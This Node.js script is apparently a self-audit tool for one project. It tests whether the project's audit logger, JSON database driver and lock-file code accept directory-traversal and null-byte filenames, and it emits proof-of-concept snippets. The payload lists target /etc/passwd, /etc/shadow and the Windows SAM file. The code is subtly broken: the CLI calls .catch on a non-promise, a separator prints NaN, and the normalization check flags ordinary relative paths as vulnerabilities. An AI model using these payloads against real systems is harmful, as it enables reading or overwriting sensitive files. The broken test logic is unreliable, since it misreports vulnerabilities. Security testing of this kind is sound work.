#!/usr/bin/env node

/**
 * Path Traversal Exploit Scripts
 * Exploits directory traversal vulnerabilities found in file operations
 * 
 * Vulnerabilities Found:
 * - No path validation in file operations (auditLogger.ts, jsonDriver.ts)
 * - Unsafe path concatenation in database operations
 * - Unvalidated file paths in log rotation
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

class PathTraversalExploiter {
  constructor(baseDir) {
    this.baseDir = baseDir || process.cwd();
  }

  /**
   * Test Path Traversal in Audit Logger
   * File: shared/src/services/auditLogger.ts:60, 99, 118
   */
  testAuditLoggerTraversal() {
    console.log('üóÇÔ∏è Testing Audit Logger Path Traversal');
    
    const maliciousPaths = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/../../../../etc/shadow',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      './../../../etc/passwd',
      'folder/../../../../etc/passwd'
    ];

    let vulnerabilities = [];
    
    for (const maliciousPath of maliciousPaths) {
      try {
        // Simulate the vulnerable code from auditLogger.ts:60
        const vulnerablePath = path.join(this.baseDir, 'logs', 'audit', maliciousPath);
        
        // Check if path escapes base directory
        const resolvedPath = path.resolve(vulnerablePath);
        if (!resolvedPath.startsWith(path.resolve(this.baseDir, 'logs', 'audit'))) {
          console.log(`üö® VULNERABLE: Audit logger accepts path traversal: ${maliciousPath}`);
          console.log(`   Resolved to: ${resolvedPath}`);
          vulnerabilities.push(maliciousPath);
        }
      } catch (error) {
        console.log(`‚úÖ Blocked: ${maliciousPath} - ${error.message}`);
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Path Traversal in JSON Database Driver
   * File: backend/src/database/jsonDriver.ts:28, 46
   */
  testJsonDriverTraversal() {
    console.log('\nüóÑÔ∏è Testing JSON Database Driver Path Traversal');
    
    const maliciousFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      'normal.json../../../etc/passwd',
      'normal.json/../../../evil.txt',
      'file<>:\"|?*.txt',
      'file\x00.txt'
    ];

    let vulnerabilities = [];
    
    for (const maliciousFilename of maliciousFilenames) {
      try {
        // Simulate the vulnerable code from jsonDriver.ts:28
        const vulnerablePath = path.join(this.baseDir, 'database', maliciousFilename);
        
        // Check if path escapes database directory
        const resolvedPath = path.resolve(vulnerablePath);
        if (!resolvedPath.startsWith(path.resolve(this.baseDir, 'database'))) {
          console.log(`üö® VULNERABLE: JSON driver accepts malicious filename: ${maliciousFilename}`);
          console.log(`   Resolved to: ${resolvedPath}`);
          vulnerabilities.push(maliciousFilename);
        }
      } catch (error) {
        console.log(`‚úÖ Blocked: ${maliciousFilename} - ${error.message}`);
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Path Traversal in Database Concurrency Control
   * File: bot/src/utils/databaseConcurrencyControl.ts:34, 59
   */
  testConcurrencyControlTraversal() {
    console.log('\nüîí Testing Database Concurrency Control Path Traversal');
    
    const maliciousFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      'valid.json../../../etc/passwd'
    ];

    let vulnerabilities = [];
    
    for (const maliciousFilename of maliciousFilenames) {
      try {
        // Simulate the vulnerable code from databaseConcurrencyControl.ts:34
        const vulnerablePath = path.join(this.baseDir, '.locks', `${maliciousFilename}.lock`);
        
        // Check if path escapes locks directory
        const resolvedPath = path.resolve(vulnerablePath);
        if (!resolvedPath.startsWith(path.resolve(this.baseDir, '.locks'))) {
          console.log(`üö® VULNERABLE: Concurrency control accepts malicious filename: ${maliciousFilename}`);
          console.log(`   Resolved to: ${resolvedPath}`);
          vulnerabilities.push(maliciousFilename);
        }
      } catch (error) {
        console.log(`‚úÖ Blocked: ${maliciousFilename} - ${error.message}`);
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Null Byte Injection
   */
  testNullByteInjection() {
    console.log('\nüß¨ Testing Null Byte Injection');
    
    const nullBytePayloads = [
      'file\x00.txt',
      'file%00.txt',
      'folder\x00../file.txt',
      'normal.json\x00../../../etc/passwd'
    ];

    let vulnerabilities = [];
    
    for (const payload of nullBytePayloads) {
      try {
        // Test on various platforms
        const unixPath = path.join('/tmp/database', payload);
        const windowsPath = path.join('C:\\app\\database', payload);
        
        // Check if null byte truncates the path
        const unixNullIndex = unixPath.indexOf('\x00');
        const windowsNullIndex = windowsPath.indexOf('\x00');
        
        if (unixNullIndex !== -1 || windowsNullIndex !== -1) {
          console.log(`üö® VULNERABLE: Null byte injection possible: ${payload}`);
          vulnerabilities.push(payload);
        }
      } catch (error) {
        console.log(`‚úÖ Blocked: ${payload} - ${error.message}`);
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Path Normalization Issues
   */
  testPathNormalization() {
    console.log('\nüîÑ Testing Path Normalization Issues');
    
    const problematicPaths = [
      'folder/..',
      'folder\\..\\',
      './folder',
      'folder/.',
      'folder//..//folder',
      'folder/./../folder'
    ];

    let vulnerabilities = [];
    
    for (const problematicPath of problematicPaths) {
      try {
        // Test path normalization behavior
        const normalized = path.normalize(problematicPath);
        const resolved = path.resolve(problematicPath);
        
        // Check for unexpected normalization results
        if (normalized !== resolved) {
          console.log(`‚ö†Ô∏è  Path normalization difference: ${problematicPath}`);
          console.log(`   Normalized: ${normalized}`);
          console.log(`   Resolved: ${resolved}`);
          vulnerabilities.push(problematicPath);
        }
      } catch (error) {
        console.log(`‚úÖ Error in normalization: ${problematicPath} - ${error.message}`);
      }
    }

    return vulnerabilities;
  }

  /**
   * Generate Proof-of-Concept Attack Scripts
   */
  generatePocScripts() {
    console.log('\nüìú Generating Proof-of-Concept Attack Scripts');
    
    // POC 1: Audit Log Injection
    const auditLogPoc = `
// POC: Audit Log Path Traversal Attack
// File: shared/src/services/auditLogger.ts

// Replace line 60 with vulnerable code:
this.config = {
  basePath: config?.basePath || path.join(process.cwd(), 'logs', 'audit'),
  // VULNERABLE: No path validation
  retentionDays: config?.retentionDays || 90,
  // ... rest of config
};

// Attack: Set basePath to malicious path
maliciousAuditLogger = new AuditLogger({
  basePath: '../../../etc/passwd'
});

// This will write audit logs to system files!
`;

    // POC 2: Database Path Injection
    const dbPoc = `
// POC: Database Path Injection
// File: backend/src/database/jsonDriver.ts

// Replace line 28 with vulnerable code:
const filePath = path.join(this.dbPath, filename);
// VULNERABLE: No filename validation

// Attack: Create malicious filename
maliciousFilename = '../../../etc/passwd';

// This will read/write system files!
const data = jsonDriver.readJsonFile(maliciousFilename);
`;

    // POC 3: Lock File Escape
    const lockPoc = `
// POC: Lock File Path Traversal
// File: bot/src/utils/databaseConcurrencyControl.ts

// Replace line 34 with vulnerable code:
const lockFilePath = path.join(this.databaseDir, this.LOCK_DIR, \`\${filename}.lock\`);
// VULNERABLE: No filename validation

// Attack: Use malicious filename
maliciousFilename = '../../../etc/passwd';

// This will create lock files in system directories!
`;

    console.log('üî¥ Generated POC scripts for:');
    console.log('   1. Audit Log Injection (auditLogPoc)');
    console.log('   2. Database Path Injection (dbPoc)');
    console.log('   3. Lock File Escape (lockPoc)');
    
    return { auditLogPoc, dbPoc, lockPoc };
  }

  /**
   * Run all path traversal tests
   */
  runAllTests() {
    console.log('üöÄ Starting Path Traversal Vulnerability Tests');
    console.log(`Base Directory: ${this.baseDir}\n`);

    const results = {
      auditLogger: this.testAuditLoggerTraversal(),
      jsonDriver: this.testJsonDriverTraversal(),
      concurrencyControl: this.testConcurrencyControlTraversal(),
      nullByteInjection: this.testNullByteInjection(),
      pathNormalization: this.testPathNormalization(),
      pocScripts: this.generatePocScripts()
    };

    console.log('\nüìä Path Traversal Test Results:');
    console.log('=' * 60);
    
    const vulnerabilityCount = results.auditLogger.length + 
                              results.jsonDriver.length + 
                              results.concurrencyControl.length +
                              results.nullByteInjection.length +
                              results.pathNormalization.length;

    console.log(`Audit Logger Vulns:    ${results.auditLogger.length}`);
    console.log(`JSON Driver Vulns:     ${results.jsonDriver.length}`);
    console.log(`Concurrency Vulns:    ${results.concurrencyControl.length}`);
    console.log(`Null Byte Vulns:      ${results.nullByteInjection.length}`);
    console.log(`Normalization Vulns:  ${results.pathNormalization.length}`);

    if (vulnerabilityCount > 0) {
      console.log(`\nüö® ${vulnerabilityCount} path traversal vulnerabilities found!`);
      console.log('üìã IMMEDIATE ACTION REQUIRED: Implement path validation');
    } else {
      console.log('\n‚úÖ All path traversal attacks were blocked');
    }

    return results;
  }
}

// CLI usage
if (require.main === module) {
  const baseDir = process.argv[2] || process.cwd();
  
  const exploiter = new PathTraversalExploiter(baseDir);
  exploiter.runAllTests().catch(console.error);
}

module.exports = PathTraversalExploiter;